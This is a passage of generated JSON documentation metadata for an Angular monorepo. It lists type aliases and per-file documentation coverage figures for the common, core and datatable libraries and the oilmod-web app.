                "rawtype": "Promise<T> | Observable<T> | T",
                "file": "libs/common/src/lib/theme/theme-saver.service.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              }
            ],
            "libs/datatable/src/lib/sto-datatable/models.ts": [
              {
                "name": "rowClassFn",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "function",
                "file": "libs/datatable/src/lib/sto-datatable/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 178
              }
            ],
            "libs/common/src/lib/theme/models.ts": [
              {
                "name": "ThemeClassName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"sto-light-theme\" | \"sto-dark-theme\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              },
              {
                "name": "ThemeName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"light\" | \"dark\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              },
              {
                "name": "TypographyClassName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"sto-sm-typography\" | \"sto-m-typography\" | \"sto-l-typography\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              },
              {
                "name": "TypographyName",
                "ctype": "miscellaneous",
                "subtype": "typealias",
                "rawtype": "\"small\" | \"medium\" | \"large\"",
                "file": "libs/common/src/lib/theme/models.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "description": "",
                "kind": 186
              }
            ]
        }
    },
    "routes": [],
    "coverage": {
      "count": 6,
      "status": "low",
      "files": [
        {
          "filePath": "apps/oilmod-web-e2e/src/support/app.po.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "getGreeting",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "apps/oilmod-web-e2e/src/support/commands.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "Chainable",
          "coveragePercent": 0,
          "coverageCount": "0/2",
          "status": "low"
        },
        {
          "filePath": "apps/oilmod-web/src/app/app.component.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "primary",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/app/app.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "AppComponent",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "apps/oilmod-web/src/environments/environment.prod.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "environment",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "apps/oilmod-web/src/environments/environment.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "environment",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
          "type": "pipe",
          "linktype": "pipe",
          "name": "ActivePreferencePipe",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "PreferenceManagerComponent",
          "coveragePercent": 41,
          "coverageCount": "12/29",
          "status": "medium"
        },
        {
          "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "preferences",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
            {
                "filePath": "libs/common/src/lib/preference-manager/preference.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Preference",
                "coveragePercent": 66,
                "coverageCount": "6/9",
                "status": "good"
            },
        {
          "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "ActionFooter",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoActionFooterComponent",
          "coveragePercent": 44,
          "coverageCount": "4/9",
          "status": "medium"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "AppHeader",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "AsTestEnvironment",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "withForm",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "WithUserMenu",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoAppHeaderComponent",
          "coveragePercent": 42,
          "coverageCount": "6/14",
          "status": "medium"
        },
            {
                "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "Breadcrumb",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
        {
          "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "BreadcrumbConfig",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "NAVIGATION_HOME_ICON",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoBreadcrumbsComponent",
          "coveragePercent": 29,
          "coverageCount": "5/17",
          "status": "medium"
        },
        {
          "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Breadcrumbs",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
          "type": "component",
          "linktype": "component",
          "name": "ConfirmDemoComponent",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Usage",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "ConfirmComponent",
          "coveragePercent": 20,
          "coverageCount": "1/5",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
          "type": "injectable",
          "linktype": "injectable",
          "name": "ConfirmService",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.service.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "dialogConfig",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "FilterPanel",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Template",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/filter.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "FilterForm",
          "coveragePercent": 15,
          "coverageCount": "2/13",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/filter.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "FilterList",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoFilterActionsBar",
          "coveragePercent": 0,
          "coverageCount": "0/8",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoFilterPanelComponent",
          "coveragePercent": 42,
          "coverageCount": "8/19",
          "status": "medium"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoFilterActions",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoFilterTableActions",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoFilterTitle",
          "coveragePercent": 100,
          "coverageCount": "1/1",
          "status": "very-good"
        },
        {
          "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Accent",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "argTypes",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Danger",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Dismissable",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Primary",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Success",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "UsageWithInput",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Warn",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "Warning",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoMessagePanelComponent",
          "coveragePercent": 15,
          "coverageCount": "2/13",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "COLORS",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/models.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "ThemeModel",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/models.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "themes",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/models.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "typography",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/svg-icons.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "iconMap",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
          "type": "injectable",
          "linktype": "injectable",
          "name": "ThemeSaverService",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "ThemeSaver",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/theme-saver.service.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "THEME_SAVER",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/lib/theme/theme.service.ts",
          "type": "injectable",
                "linktype": "injectable",
                "name": "StoThemeService",
                "coveragePercent": 0,
                "coverageCount": "0/20",
                "status": "low"
            },
            {
                "filePath": "libs/common/src/test-utils.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "breadCrumbs",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
        {
          "filePath": "libs/common/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "context",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/common/src/test.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "require",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/context-menu.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "ContextMenuDirective",
          "coveragePercent": 0,
          "coverageCount": "0/6",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/date-form-field-click.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "DateFormFieldClickDirective",
          "coveragePercent": 12,
          "coverageCount": "1/8",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "StoContextMenu",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/directives.stories.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "StoGrid",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/menu-overlay.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "MenuOverlayDirective",
          "coveragePercent": 0,
          "coverageCount": "0/9",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/quick-keys.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "QuickKeysDirective",
          "coveragePercent": 88,
          "coverageCount": "8/9",
          "status": "very-good"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoGridColumnDirective",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoGridDirective",
          "coveragePercent": 0,
          "coverageCount": "0/11",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoGridSpacerDirective",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "BreakpointConfig",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "ALL_GRIDS",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
          "type": "variable",
          "linktype": "miscellaneous",
          "linksubtype": "variable",
          "name": "getClass",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
          "type": "directive",
          "linktype": "directive",
          "name": "StoSelectTextOnFocusDirective",
          "coveragePercent": 50,
          "coverageCount": "5/10",
          "status": "medium"
        },
        {
          "filePath": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
          "type": "pipe",
          "linktype": "pipe",
          "name": "CurrencyFormatPipe",
          "coveragePercent": 100,
          "coverageCount": "1/1",
          "status": "very-good"
        },
        {
          "filePath": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
          "type": "pipe",
          "linktype": "pipe",
          "name": "DateFormatPipe",
          "coveragePercent": 100,
          "coverageCount": "1/1",
          "status": "very-good"
        },
        {
          "filePath": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "KeysPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "NumberFormatPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ExcludeUnit",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "GetUnit",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/yes-no.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "YesNoPipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoUserPreferenceComponent",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "StoUserPreferenceService",
                "coveragePercent": 0,
                "coverageCount": "0/8",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "preferenceKey",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "component",
                "linktype": "component",
                "name": "DialogDemoComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoCard",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoDialog",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoTheme",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Actionbar",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "AutoSize",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "MultilineFooter",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Paging",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ResponsiveMode",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "columns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "fixedColumns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "manyColumns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "pipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "rows",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ColumnStylePipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Column",
                "coveragePercent": 0,
                "coverageCount": "0/16",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "type": "class",
                "linktype": "classe",
                "name": "ColumnGroup",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "Activate",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ContextMenu",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowActivation",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowCtx",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowSelection",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
          "type": "pipe",
          "linktype": "pipe",
          "name": "ExecPipe",
          "coveragePercent": 0,
          "coverageCount": "0/1",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/models.ts",
          "type": "interface",
          "linktype": "interface",
          "name": "SortColumn",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDatatableActionsComponent",
          "coveragePercent": 0,
          "coverageCount": "0/4",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDataTableActionsLeftComponent",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDataTableActionsRightComponent",
          "coveragePercent": 0,
          "coverageCount": "0/3",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDatatableBodyRowComponent",
          "coveragePercent": 0,
          "coverageCount": "0/15",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDatatableBodyComponent",
          "coveragePercent": 0,
          "coverageCount": "0/44",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
          "type": "component",
          "linktype": "component",
          "name": "StoDatatableHeaderGroupComponent",
          "coveragePercent": 0,
          "coverageCount": "0/8",
          "status": "low"
        },
        {
          "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
